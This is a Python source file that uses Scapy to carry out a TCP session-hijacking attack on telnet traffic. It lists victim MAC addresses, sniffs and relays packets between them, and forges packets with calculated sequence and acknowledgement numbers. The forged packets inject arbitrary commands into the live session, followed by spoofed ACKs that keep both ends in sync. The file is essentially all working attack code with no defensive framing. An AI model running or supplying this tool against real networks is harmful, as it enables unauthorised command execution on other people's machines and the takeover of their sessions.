from scapy.all import IP, TCP, send, sniff, Raw, sr1
import threading
import time

victims = ["08:00:27:f6:f7:d1", "08:00:27:dc:6d:4f"]
myHwaddr = "a0:36:bc:bb:59:dc"

class SessionHijacker:
    unlockResponse = True
    
    def __init__(self):
        redirect_thread = threading.Thread(target=self.sniff_and_redirect_packet)        
        redirect_thread.start()
    
    def prepare_packet(self, packet, command):
        sequence = self.calculate_sequence_number(packet)
        acknowledgement = self.calculate_acknowledgement_number(packet)
        command = command + '\r\n'
        
        return IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(dport=packet[TCP].dport, sport=packet[TCP].sport, flags='PA', seq=sequence, ack=acknowledgement) / command
        
    def calculate_sequence_number(self, packet):
        return packet[TCP].seq + (len(packet[Raw]) if packet.haslayer(Raw) else 0)
        
    def calculate_acknowledgement_number(self, packet):
        return packet[TCP].ack + (len(packet[Raw]) if packet.haslayer(Raw) else 0)

    def inject_command(self, packet, command):        
        server_thread = threading.Thread(target=self.sniff_and_send, args=(packet, command))
        server_thread.start()

    def sniff_and_send(self, packet, command):
        prepared_packet = self.prepare_packet(packet, command)
        res = sr1(prepared_packet, verbose=False)
        self.unlockResponse = False
        send(self.build_ack_response(res, True), verbose=False)
        send(self.build_ack_response(res, False), verbose=False)
        time.sleep(0.1)
        self.unlockResponse = True
        

    def build_ack_response(self, packet, isServer):
        if isServer:
            seq = packet[TCP].ack
            ack = packet[TCP].seq + len(packet[Raw].load)
            return IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags='A', seq=seq, ack=ack)
        else:
            seq = packet[TCP].ack
            ack = packet[TCP].seq + len(packet[Raw].load)
            return IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(dport=packet[TCP].dport, sport=packet[TCP].sport, flags='A', seq=seq, ack=ack)

    def sniff_server_packets(self):
        return sniff(lfilter=lambda p: p.haslayer(TCP) and p[TCP].flags == 'PA' and len(p[Raw]) > 0, prn=self.process_packet, store=0)
    
    def sniff_and_redirect_packet(self):
        filter = f"tcp and port 23 and not ether src {myHwaddr}"
        sniff(prn=self.redirect_packet, store=0, filter=filter)

    def redirect_packet(self, packet):
        if packet.haslayer(TCP) and self.unlockResponse:            
            ip_layer = IP(src=packet[IP].src, dst=packet[IP].dst)
            tcp_layer = TCP(dport=packet[TCP].dport, sport=packet[TCP].sport, flags=packet[TCP].flags, seq=packet[TCP].seq, ack=packet[TCP].ack)
            
            if packet.haslayer(Raw):
                new_packet = ip_layer / tcp_layer / packet[Raw]
            else:
                new_packet = ip_layer / tcp_layer
                
            send(new_packet, verbose=False)

